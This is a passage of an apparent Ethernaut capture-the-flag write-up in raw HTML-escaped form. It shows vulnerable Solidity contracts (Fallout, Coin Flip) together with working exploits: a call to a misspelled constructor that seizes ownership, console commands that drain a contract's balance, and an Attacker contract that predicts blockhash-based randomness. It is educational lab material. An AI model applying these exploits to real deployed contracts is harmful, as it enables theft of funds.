&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9&amp;#39;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; await &lt;&#x2F;span&gt;&lt;span&gt;contract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;withdraw&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;sendTransaction&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#5e81ac;&quot;&gt;tx&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;0x0eea3783ce911fb2c7fda42b5f44f60b63c1b6f1e862a7e463bbd6469e592320&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#5e81ac;&quot;&gt;receipt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;{…}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#5e81ac;&quot;&gt;logs&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Array&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; await &lt;&#x2F;span&gt;&lt;span&gt;web3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;eth&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getBalance&lt;&#x2F;span&gt;&lt;span&gt;(contract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;address)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;0&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;fallout&quot;&gt;Fallout&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.6.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;#39;openzeppelin-contracts-06&#x2F;math&#x2F;SafeMath.sol&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Fallout &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  
&lt;&#x2F;span&gt;&lt;span&gt;  using SafeMath for &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  mapping (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;) allocations;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address payable public&lt;&#x2F;span&gt;&lt;span&gt; owner;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Fal1out&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public payable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    allocations[owner] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;onlyOwner &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;	        require(
&lt;&#x2F;span&gt;&lt;span&gt;	            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender ==&lt;&#x2F;span&gt;&lt;span&gt; owner,
&lt;&#x2F;span&gt;&lt;span&gt;	            &amp;quot;caller is not the owner&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;	        );
&lt;&#x2F;span&gt;&lt;span&gt;	        _;
&lt;&#x2F;span&gt;&lt;span&gt;	    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;allocate&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public payable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    allocations[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; allocations[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;].&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;add&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;sendAllocation&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address payable &lt;&#x2F;span&gt;&lt;span&gt;allocator) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    require(allocations[allocator] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    allocator.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(allocations[allocator]);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;collectAllocations&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public onlyOwner &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;).balance);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;allocatorBalance&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;allocator) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public view &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    return allocations[allocator];
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;In early version of solidity, the function with the same name as the contract was used as the constructor. Wrong spelling of word &lt;code&gt;Fallout&lt;&#x2F;code&gt; causes &lt;code&gt;owner &lt;&#x2F;code&gt; variable to be uninitialized and can be called externally for assignment. Reference https:&#x2F;&#x2F;docs.soliditylang.org&#x2F;en&#x2F;v0.8.21&#x2F;050-breaking-changes.html#constructors&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; await &lt;&#x2F;span&gt;&lt;span&gt;contract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;Fal1out&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;sendTransaction&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#5e81ac;&quot;&gt;tx&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;0xca9b301bac18f13c460eb71103e972efbe08bc07821a322945b947e629aa445d&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#5e81ac;&quot;&gt;receipt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;{…}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#5e81ac;&quot;&gt;logs&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Array&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; await &lt;&#x2F;span&gt;&lt;span&gt;contract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;owner&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;player
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; true
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;coin-flip&quot;&gt;Coin Flip&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;CoinFlip &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 public&lt;&#x2F;span&gt;&lt;span&gt; consecutiveWins;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt; lastHash;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt; FACTOR &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;57896044618658097711785492504343953926634992332820282019728792003956564819968&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  constructor() {
&lt;&#x2F;span&gt;&lt;span&gt;    consecutiveWins &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;flip&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool &lt;&#x2F;span&gt;&lt;span&gt;_guess) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt; blockValue &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= uint256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;blockhash&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;block&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;number - &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    if (lastHash &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;==&lt;&#x2F;span&gt;&lt;span&gt; blockValue) {
&lt;&#x2F;span&gt;&lt;span&gt;      revert();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    lastHash &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; blockValue;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt; coinFlip &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; blockValue &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt; FACTOR;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt; side &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; coinFlip &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;? true : false&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    if (side &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;==&lt;&#x2F;span&gt;&lt;span&gt; _guess) {
&lt;&#x2F;span&gt;&lt;span&gt;      consecutiveWins&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;      return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    } else {
&lt;&#x2F;span&gt;&lt;span&gt;      consecutiveWins &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;      return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;false&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The target is to increase consistentWins to 10, which is the value of successfully guess the &lt;code&gt;side&lt;&#x2F;code&gt; variable ten times in a row.&lt;&#x2F;p&gt;
&lt;p&gt;Observing the generation logic of the side variable, easily know that this is a pseudo-random number generation method. This means that we can predict this result in the attacker’s contract.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;#39;.&#x2F;SafeMath.sol&amp;#39;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; https:&#x2F;&#x2F;github.com&#x2F;ConsenSysMesh&#x2F;openzeppelin-solidity&#x2F;blob&#x2F;master&#x2F;contracts&#x2F;math&#x2F;SafeMath.sol
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;#39;.&#x2F;coinflip.sol&amp;#39;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; challenge source code
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Attacker&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    using SafeMath for &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    CoinFlip &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;coinFlipContract;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt; FACTOR &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;57896044618658097711785492504343953926634992332820282019728792003956564819968&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_coinFlipContract) {
&lt;&#x2F;span&gt;&lt;span&gt;        coinFlipContract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;CoinFlip&lt;&#x2F;span&gt;&lt;span&gt;(_coinFlipContract);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;guessFlip&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt; blockValue &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= uint256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;blockhash&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;block&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;number&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;sub&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)));
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt; coinFlip &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; blockValue.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;div&lt;&#x2F;span&gt;&lt;span&gt;(FACTOR);
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt; guess &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; coinFlip &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;? true : false&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        coinFlipContract.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;flip&lt;&#x2F;span&gt;&lt;span&gt;(guess);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;telephone&quot;&gt;Telephone&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Telephone &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; owner;
